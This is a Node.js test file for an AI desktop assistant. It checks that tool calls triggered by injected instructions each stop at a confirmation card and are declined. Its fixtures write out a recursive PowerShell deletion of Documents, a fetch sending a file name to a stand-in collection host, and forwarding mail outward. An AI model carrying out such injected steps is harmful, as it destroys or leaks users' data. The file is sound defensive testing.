import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { Brain } from "../src/brain.js";

// The other half of roadmap 2.6: whatever a model makes of instructions it read, everything that changes the PC or
// sends something out stops at Buddy's card, which says plainly what would happen, and "Don't" leaves it undone.
// Here a model has obeyed every instruction (each call below is what an injected text asked for); the card says no.

test("obeying hidden instructions still stops at the card: each harmful step says what it would do, and Don't leaves it undone", async (t) => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "buddy-inject-"));
  t.after(() => fs.rmSync(home, { recursive: true, force: true }));
  const docs = path.join(home, "Documents");
  const buddyDocs = path.join(docs, "Buddy");
  const data = path.join(home, "Data");
  for (const d of [buddyDocs, data]) fs.mkdirSync(d, { recursive: true });
  const budget = path.join(docs, "Budget.xlsx");
  fs.writeFileSync(budget, "numbers");
  /** @type {{ summary: string, note: string }[]} */
  const cards = [];
  /** @type {string[]} */
  const sent = [];
  const b = new Brain({
    apiKey: "sk-test", status() {}, point: async () => {}, advanced: () => true, commands: () => true,
    documentsDir: buddyDocs, dataDir: data, readFolders: () => [docs],
    openFile: async () => "opened",
    confirm: async (summary, _bounds, note) => (cards.push({ summary, note: String(note ?? "") }), "deny"),
    connectors: {
      tools: () => [],
      describe: (name) => (name === "mail__send_mail" ? { service: "Mail", action: "Send an email", once: true } : null),
      note: async (_name, input) => `To ${input.to.join(", ")} · Subject: ${input.subject}`,
      call: async (name) => (sent.push(name), "sent"),
    },
  });
  b.abort = new AbortController();
  b.standing = new Set();

  /** Each harmful step a text might ask for, and words its card must show so the user can tell what it is. */
  const steps = [
    ["write_file", { path: budget, content: "" }, /Budget\.xlsx/],
    ["edit_file", { path: budget, old_text: "numbers", new_text: "" }, /Budget\.xlsx/],
    ["run_powershell", { command: "Remove-Item -Recurse -Force $HOME\\Documents" }, /Remove-Item -Recurse -Force/],
    ["copy_files", { from: budget, to: path.join(buddyDocs, "out") }, /Budget\.xlsx/],
    ["fetch_page", { url: "https://collect.example.invalid/?files=Budget.xlsx" }, /collect\.example\.invalid\/\?files=Budget\.xlsx/],
    ["mail__send_mail", { to: ["backup@example.invalid"], subject: "Fwd", body: "x" }, /backup@example\.invalid/],
    ["create_document", { title: "Passwords", markdown: "x" }, /Passwords/],
  ];
  for (const [name, input, shows] of steps) {
    const before = cards.length;
    const out = String(await b.runTool(/** @type {string} */ (name), input));
    assert.equal(cards.length, before + 1, `${name} asked on the card (it said: ${out.slice(0, 120)})`);
    const card = cards.at(-1);
    assert.match(`${card?.summary}\n${card?.note}`, /** @type {RegExp} */ (shows), `${name}'s card says what it would do`);
    assert.match(out, /declined/i, `${name} wasn't done`);
  }
  assert.equal(fs.readFileSync(budget, "utf8"), "numbers", "the file is as it was");
  assert.deepEqual(fs.readdirSync(buddyDocs), [], "nothing copied or created");
  assert.deepEqual(sent, [], "nothing sent");
});

test("through an AI app's own tools too, a web fetch is never allowed for the rest of the task", async () => {
  const { scopeOf } = await import("../src/agent-brain.js");
  assert.equal(scopeOf("WebFetch", { url: "https://news.example/a" }), undefined, "no scope: each fetch asks");
  assert.equal(scopeOf("PowerShell", {}), "powershell");
});
